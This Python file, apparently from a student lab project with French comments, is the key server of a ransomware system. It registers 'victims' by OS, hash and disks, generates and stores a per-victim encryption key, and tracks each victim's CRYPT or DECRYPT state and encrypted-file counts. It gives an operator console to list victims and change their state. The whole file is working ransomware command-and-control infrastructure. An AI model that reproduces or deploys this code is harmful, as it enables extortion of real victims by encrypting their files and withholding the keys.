import queue
import threading

import utile.network as network
import utile.message as message
import utile.data as data
import utile.security as security

from utile.data import connect_db, select_data, get_list_history
from base64 import b64encode
import utile.config as config

# Constantes
config.load_config("config/serveur_cles.cfg", "config/serveur_cles_key.bin")
IP_SERV_CONSOLE = config.get_config("IP_SERV_CONSOLE")
IP_SERV_FRONTAL = config.get_config("IP_SERV_FRONTAL")
PORT_SERV_CONSOLE = config.get_config("PORT_SERV_CONSOLE")
PORT_SERV_FRONTAL = config.get_config("PORT_SERV_FRONTAL")


def reponse_liste_victime(conn_db, q_reponse_console):
    victims = data.get_list_victims(conn_db)

    for victim in victims:
        # Envoi des messages list_victim_resp
        reponse = message.set_message('list_victim_resp', victim)

        q_reponse_console.put(reponse)
        q_reponse_console.join()

    # Envoi du message list_victim_end
    reponse = message.set_message('list_victim_end')

    q_reponse_console.put(reponse)

def reponse_historique(conn_db, requete, q_reponse_console):
    historique = data.get_list_history(conn_db, requete['HIST_REQ'])
    for etat in historique:
        reponse = message.set_message('HISTORY_RESP', etat)

        q_reponse_console.put(reponse)
        q_reponse_console.join()

    fin = message.set_message('HISTORY_END', (requete['HIST_REQ'],))
    q_reponse_console.put(fin)

def reponse_change_state(conn_db, requete):
    data.insert_data(conn_db, 'states', ['hash_victim', 'state'], (requete['CHGSTATE'], requete['STATE']))
    print("La table states a été mise à jour.")
    print(f"L'état de la victime {requete['CHGSTATE']} est passé à [DECRYPT]")

def thread_console(q_requete, q_reponse_console):

    s_serveur = network.start_net_serv(ip=IP_SERV_CONSOLE, port=PORT_SERV_CONSOLE)

    while True:

        print(f"Le serveur de clés [CONSOLE] est en écoute sur {IP_SERV_CONSOLE}:{PORT_SERV_CONSOLE}.")
        connexion_oclient, address = s_serveur.accept()
        cle_aes_gcm_console = network.diffie_hellman_send_key(connexion_oclient)
        IP_client, port = address
        print(f"Le serveur de clés [CONSOLE] a établie une connexion avec {IP_client} sur le port : {port}")


        while True:
            # Réception du premier message
            requete = network.receive_with_aes(connexion_oclient, cle_aes_gcm_console)
            if not requete:  # La connexion a été fermée
                adieu = "La connexion est fermée au niveau du serveur."
                network.send_message(connexion_oclient, adieu)
                connexion_oclient.close()
                break


            message_type = message.get_message_type(requete)

            # Si le message reçu est un list_victim_req
            if message_type == 'LIST_VICTIM_REQ':
                q_requete.put(requete)

                while message_type != 'LIST_VICTIM_END':
                    reponse = q_reponse_console.get()
                    message_type = message.get_message_type(reponse)
                    network.send_with_aes(connexion_oclient, reponse, cle_aes_gcm_console)
                    q_reponse_console.task_done()



            elif message_type == 'HISTORY_REQ':
                q_requete.put(requete)

                while message_type != 'HISTORY_END':
                    reponse = q_reponse_console.get()
                    message_type = message.get_message_type(reponse)
                    network.send_with_aes(connexion_oclient, reponse, cle_aes_gcm_console)
                    q_reponse_console.task_done()



            elif message_type == 'CHANGE_STATE':
                q_requete.put(requete)

def thread_serveur_frontal(q_requete, q_reponse_frontal):

    s_serveur = network.start_net_serv(ip=IP_SERV_FRONTAL, port=PORT_SERV_FRONTAL)

    while True:
        print(f"Le serveur de clés [FRONTAL] est en écoute sur {IP_SERV_FRONTAL}:{PORT_SERV_FRONTAL}.")
        connexion_oclient, address = s_serveur.accept()
        IP_client, port = address
        print(f"\nLe serveur de clés [FRONTAL] a établie une connexion avec {IP_client} sur le port : {port}")
        cle_aes_gcm_frontal = network.diffie_hellman_send_key(connexion_oclient)


        while True:
            requete = network.receive_with_aes(connexion_oclient, cle_aes_gcm_frontal)
            if not requete:  # La connexion a été fermée
                adieu = "La connexion est fermée au niveau du serveur."
                network.send_message(connexion_oclient, adieu)
                connexion_oclient.close()
                break


            message_type = message.get_message_type(requete)


            if message_type == 'CRYPT_REQ':
                q_requete.put(requete)
                reponse = q_reponse_frontal.get()
                network.send_with_aes(connexion_oclient, reponse, cle_aes_gcm_frontal)
                q_reponse_frontal.task_done() # Il est 1h du mat quand je rajoute cette ligne, si le code foire à un
                # moment, regardez ici

            elif message_type == "PENDING_MSG":
                q_requete.put(requete)
                reponse = q_reponse_frontal.get()
                network.send_with_aes(connexion_oclient, reponse, cle_aes_gcm_frontal)
                q_reponse_frontal.task_done()




def main():

    conn_db = connect_db()

    q_requete = queue.Queue()
    q_reponse_console = queue.Queue()
    q_reponse_frontal = queue.Queue()
    t_console = threading.Thread(target=thread_console, args=(q_requete, q_reponse_console), daemon=True)
    t_frontal = threading.Thread(target=thread_serveur_frontal, args=(q_requete,q_reponse_frontal), daemon=True)
    t_console.start()
    t_frontal.start()

    while True:
        # Réception du premier message
        requete = q_requete.get()

        if not requete:  # La connexion a été fermée
            print("Fin de connexion.\n")
            break

        message_type = message.get_message_type(requete)

        # Si le message reçu est un list_victim_req
        if message_type == 'LIST_VICTIM_REQ':
            reponse_liste_victime(conn_db, q_reponse_console)



        elif message_type == 'HISTORY_REQ':
            reponse_historique(conn_db, requete, q_reponse_console)


        elif message_type == 'CHANGE_STATE':
            reponse_change_state(conn_db, requete)


        # labo 3 - échange serveur frontal
        elif message_type == 'CRYPT_REQ':
            hash_victim = requete["INITIALIZE"]
            if select_data(conn_db, f"SELECT hash FROM victims WHERE hash = ?",(hash_victim,)) == []:
                cle_victime = b64encode(security.gen_key(512)).decode()
                info_victime = requete
                data.insert_data(conn_db, 'victims', ['OS', 'hash', 'disks', 'key'],
                                 [info_victime['OS'], info_victime['INITIALIZE'], info_victime['DISKS'],
                                  cle_victime])
                data.insert_data(conn_db, 'states', ['hash_victim', 'state'], [info_victime['INITIALIZE'], 'CRYPT'])
                data.insert_data(conn_db, 'encrypted', ['hash_victim', 'nb_files'], [info_victime['INITIALIZE'], 0])
                print("Victime ajouté à la base de données.")
                reponse = message.set_message('crypt_key', (info_victime['INITIALIZE'], cle_victime, 'CRYPT'))
                q_reponse_frontal.put(reponse)
                q_reponse_frontal.join()


            else:
                print("Cette victime est déja dans notre base de données.")
                cle_victime = \
                select_data(conn_db, f"SELECT key FROM victims WHERE hash = ?", (requete['INITIALIZE'],))[0][0]
                state = get_list_history(conn_db, requete["INITIALIZE"])[-1][-2]
                reponse = message.set_message('crypt_key', (requete['INITIALIZE'], cle_victime, state))
                q_reponse_frontal.put(reponse)
                q_reponse_frontal.join()



        elif message_type == "PENDING_MSG":
            data.insert_data(conn_db, 'encrypted', ['hash_victim', 'nb_files'],[requete['PENDING']
                ,requete['NB_FILES']])
            #reponse = "CONTINUE"
            # q_reponse_frontal.put(reponse)




if __name__ == '__main__':
    main()
